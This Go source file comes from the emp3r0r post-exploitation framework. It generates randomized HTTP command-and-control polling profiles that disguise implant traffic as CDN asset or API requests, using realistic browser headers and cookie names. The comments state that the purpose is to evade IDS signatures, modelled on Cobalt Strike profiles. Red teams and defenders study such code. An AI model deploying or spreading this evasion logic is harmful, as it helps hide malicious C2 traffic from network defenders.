package transport

import (
	"fmt"
	"slices"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// This file generates the default HTTP polling ("malleable") profile. A single
// hard-coded profile is a network signature: every deployment shares the same
// path, cookie names and User-Agent, so one IDS rule catches them all. The
// generator below draws a fresh, internally consistent profile so installs do
// not look alike, while still using plausible API/browser values.
//
// The agent and the CC must agree on the exact profile, so callers persist the
// generated value in the config file (and embed it in the agent) instead of
// regenerating it on every load.

// mallStaticAssets are CS-style cover URIs that look like ordinary CDN,
// JavaScript, stylesheet and font traffic. Some contain a %s cache-busting
// token, mirroring hashed asset filenames.
var (
	mallStaticAssets = []struct{ path, dest string }{
		{"/jquery-3.3.1.min.js", "script"},
		{"/jquery-3.6.4.min.js", "script"},
		{"/static/js/main.%s.js", "script"},
		{"/static/js/runtime-main.%s.js", "script"},
		{"/assets/js/app.%s.js", "script"},
		{"/assets/css/main.%s.css", "style"},
		{"/static/media/logo.%s.svg", "image"},
		{"/assets/fonts/inter-%s.woff2", "font"},
		{"/assets/images/hero-%s.webp", "image"},
	}
	mallAPIPrefixes = []string{
		"/api/v2", "/api/v3", "/v2", "/services/api", "/rest/v2",
	}
	mallAPIResources = []string{
		"orders", "catalog", "notifications", "profile", "settings", "search",
		"inventory", "subscriptions", "account", "content", "recommendations",
		"payments", "bookmarks", "preferences",
	}
	// Cobalt Strike's default jQuery profile carries the session in a
	// session_id cookie. Header carriers are retained as a less common variant,
	// but use ordinary tracing/correlation names rather than random X-* values.
	mallSessionHeaders = []string{
		"X-Session-ID", "X-Correlation-ID", "X-Request-ID", "X-Trace-ID", "X-Client-ID",
	}
	mallInitHeaders = []string{
		"X-CSRF-Token", "X-Client-Version", "X-Request-Start", "X-Init-Token", "X-Requested-With",
	}
	mallCloseHeaders = []string{
		"X-Client-Done", "X-Close-Token", "X-Request-End", "X-Session-End", "X-Connection-Close",
	}
	mallSessionCookies = []string{
		"session_id", "JSESSIONID", "PHPSESSID", "connect.sid", "csrftoken", "sid", "AWSALB",
	}
	mallInitCookies = []string{
		"_ga", "_gid", "csrf_token", "XSRF-TOKEN", "locale", "tz", "consent", "__cf_bm",
	}
	mallCloseCookies = []string{
		"_gat", "prefs", "theme", "currency", "region", "remember_me", "device_id", "last_seen",
	}
	// mallUserAgents are current-ish browser strings. A browser User-Agent with
	// no matching browser headers is itself a tell, so randomMalleableHeaders
	// always pairs a UA with a consistent header set.
	mallUserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
	}
	mallAcceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"en-US,en;q=0.8",
		"en-CA,en;q=0.9,fr-CA;q=0.8",
	}
)

func pick[T any](items []T) T {
	return items[util.RandInt(0, len(items))]
}

// randomMalleableCover picks either a static-asset URI or a quieter API route
// and returns the matching browser header set. The static-asset case mirrors
// the widely used Cobalt Strike jQuery default.
func randomMalleableCover() (string, map[string]string) {
	if util.RandInt(0, 100) < 70 {
		asset := pick(mallStaticAssets)
		path := asset.path
		if strings.Contains(path, "%s") {
			path = fmt.Sprintf(path, strings.ToLower(util.RandStr(util.RandInt(8, 13))))
		}
		headers := map[string]string{
			"User-Agent":      pick(mallUserAgents),
			"Accept":          "*/*",
			"Accept-Language": pick(mallAcceptLanguages),
			"Sec-Fetch-Dest":  asset.dest,
			"Sec-Fetch-Mode":  "no-cors",
			"Sec-Fetch-Site":  "same-origin",
		}
		return path, headers
	}

	path := fmt.Sprintf("%s/%s", pick(mallAPIPrefixes), pick(mallAPIResources))
	switch util.RandInt(0, 3) {
	case 0:
		path += fmt.Sprintf("/%d", util.RandInt(1, 1_000_000))
	case 1:
		path += "/" + strings.ToLower(util.RandStr(util.RandInt(4, 8)))
	}
	return path, map[string]string{
		"User-Agent":      pick(mallUserAgents),
		"Accept":          "application/json, text/plain, */*",
		"Accept-Language": pick(mallAcceptLanguages),
		"Sec-Fetch-Dest":  "empty",
		"Sec-Fetch-Mode":  "cors",
		"Sec-Fetch-Site":  "same-origin",
	}
}

func randomHeaderValue() string {
	return util.RandStr(util.RandInt(10, 20))
}

func randomHeaderFrom(pool []string, taken ...string) string {
	for range 16 {
		name := pick(pool)
		if !slices.ContainsFunc(taken, func(item string) bool {
			return strings.EqualFold(item, name)
		}) {
			return name
		}
	}
	return pool[0] + "-" + strings.ToUpper(util.RandStr(4))
}

func randomCookieFrom(pool []string, taken ...string) string {
	for range 16 {
		name := pick(pool)
		if !slices.Contains(taken, name) {
			return name
		}
	}
	return pool[0] + "_" + strings.ToLower(util.RandStr(4))
}

// RandomMalleableHTTPConfig returns a complete, internally consistent HTTP
// profile with a randomized static-asset/API cover, session carrier and
// browser headers.
func RandomMalleableHTTPConfig() def.MalleableHTTPConfig {
	path, headers := randomMalleableCover()
	profile := def.MalleableHTTPConfig{
		C2Path:        path,
		CustomHeaders: headers,
	}

	// CS-style profiles normally carry the session in cookies. Header carriers
	// remain as a lower-probability variant for deployments that prefer them.
	if util.RandInt(0, 100) < 15 {
		profile.SessionHeader = randomHeaderFrom(mallSessionHeaders)
		profile.SessionValue = "%s"
		profile.InitHeader = randomHeaderFrom(mallInitHeaders, profile.SessionHeader)
		profile.InitValue = randomHeaderValue()
		profile.CloseHeader = randomHeaderFrom(mallCloseHeaders, profile.SessionHeader, profile.InitHeader)
		profile.CloseValue = randomHeaderValue()
		return profile
	}

	sessionCookie := randomCookieFrom(mallSessionCookies)
	initCookie := randomCookieFrom(mallInitCookies, sessionCookie)
	closeCookie := randomCookieFrom(mallCloseCookies, sessionCookie, initCookie)
	profile.SessionHeader = "Cookie"
	profile.SessionValue = sessionCookie + "=%s"
	profile.InitHeader = "Cookie"
	profile.InitValue = initCookie + "=" + randomHeaderValue()
	profile.CloseHeader = "Cookie"
	profile.CloseValue = closeCookie + "=" + randomHeaderValue()
	return profile
}

// isCompleteMalleableConfig reports whether a profile specifies every field the
// client and server need. A partial profile is unusable: the session lookup and
// init/close detection would disagree between the two sides.
func isCompleteMalleableConfig(cfg def.MalleableHTTPConfig) bool {
	return cfg.C2Path != "" &&
		cfg.SessionHeader != "" && cfg.SessionValue != "" &&
		cfg.InitHeader != "" && cfg.InitValue != "" &&
		cfg.CloseHeader != "" && cfg.CloseValue != "" &&
		len(cfg.CustomHeaders) > 0
}

// NormalizeMalleableHTTPConfig preserves a fully specified profile and replaces
// an incomplete one with a fresh random profile. Callers must persist the
// result before the same profile is needed by both agent and CC.
func NormalizeMalleableHTTPConfig(cfg def.MalleableHTTPConfig) def.MalleableHTTPConfig {
	if isCompleteMalleableConfig(cfg) {
		return cfg
	}
	return RandomMalleableHTTPConfig()
}
